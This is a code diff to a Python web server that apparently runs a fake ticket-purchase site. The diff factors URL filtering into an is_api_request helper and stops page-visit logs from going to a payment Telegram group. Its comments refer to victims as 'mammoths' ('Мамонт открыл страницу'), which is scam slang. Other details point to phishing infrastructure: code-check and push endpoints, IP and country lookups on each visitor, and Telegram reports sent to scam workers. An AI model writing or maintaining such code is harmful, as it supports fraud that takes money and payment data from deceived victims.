@@ -188,6 +188,23 @@ def get_country_by_ip(ip):
         print(f"[DEBUG] Error getting country for {ip}: {e}")
         return "Unknown"
 
+def is_api_request(path):
+    """Перевіряє, чи це API запит"""
+    api_patterns = [
+        '/check_',      # check_support, check_push, check_code_redirect
+        '/api/',        # API запити
+        '/update_',     # Оновлення
+        '/get_',        # get_custom_text
+        '/buy-tickets/loading/',  # Сторінки завантаження
+        '/file/',       # Файли
+        '/favicon.ico'  # Favicon
+    ]
+    
+    for pattern in api_patterns:
+        if path.startswith(pattern):
+            return True
+    return False
+
 @log_function
 def send_telegram_log(page, link, ip, country="", extra_user_id=None, important=False):
     print(f"[DEBUG] send_telegram_log called with: page={page}, link={link}, ip={ip}, country='{country}'")
@@ -211,7 +228,7 @@ def send_telegram_log(page, link, ip, country="", extra_user_id=None, important=
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
     data_admin = {"chat_id": ADMIN_ID, "text": msg}
     data_group = {"chat_id": GROUP_ID, "text": msg}
-    data_group2 = {"chat_id": PAYMENT_GROUP_ID, "text": msg}
+    # data_group2 = {"chat_id": PAYMENT_GROUP_ID, "text": msg}  # НЕ використовуємо для логів сторінок
     
     try:
         # Якщо це лог для event creator, надсилаємо тільки йому
@@ -226,7 +243,8 @@ def send_telegram_log(page, link, ip, country="", extra_user_id=None, important=
             # Звичайне логування для адміністраторів
             if important:
                 requests.post(url, data=data_group, timeout=1)
-                requests.post(url, data=data_group2, timeout=1)
+                # НЕ надсилаємо лог "Мамонт открыл страницу" в платіжну групу
+                # requests.post(url, data=data_group2, timeout=1)
             requests.post(url, data=data_admin, timeout=1)
             
             # Надсилаємо лог всім адміністраторам
@@ -368,13 +386,7 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
         is_real_page = (
             not any(ext in orig_path for ext in skip_ext) and 
             not any(d in orig_path for d in skip_dirs) and
-            not orig_path.startswith('/check_') and  # Не логуємо API запити
-            not orig_path.startswith('/api/') and    # Не логуємо API запити
-            not orig_path.startswith('/update_') and # Не логуємо оновлення
-            not orig_path.startswith('/get_') and    # Не логуємо API запити
-            not orig_path.startswith('/buy-tickets/loading/') and  # Не логуємо завантаження
-            orig_path != '/favicon.ico' and          # Не логуємо favicon
-            not orig_path.startswith('/file/')       # Не логуємо файли
+            not is_api_request(orig_path)  # Використовуємо функцію для перевірки API
         )
         
         # Перевіряємо User-Agent для фільтрації Telegram
@@ -441,13 +453,7 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
         should_log = (
             not any(ext in norm_path for ext in skip_ext) and 
             not any(d in norm_path for d in skip_dirs) and
-            not norm_path.startswith('/check_') and  # Не логуємо API запити
-            not norm_path.startswith('/api/') and    # Не логуємо API запити
-            not norm_path.startswith('/update_') and # Не логуємо оновлення
-            not norm_path.startswith('/get_') and    # Не логуємо API запити
-            not norm_path.startswith('/buy-tickets/loading/') and  # Не логуємо завантаження
-            norm_path != '/favicon.ico' and          # Не логуємо favicon
-            not norm_path.startswith('/file/')       # Не логуємо файли
+            not is_api_request(norm_path)  # Використовуємо функцію для перевірки API
         )
         
         # --- LOGIC CHANGE: always log to event creator if ?page=code, regardless of should_log ---
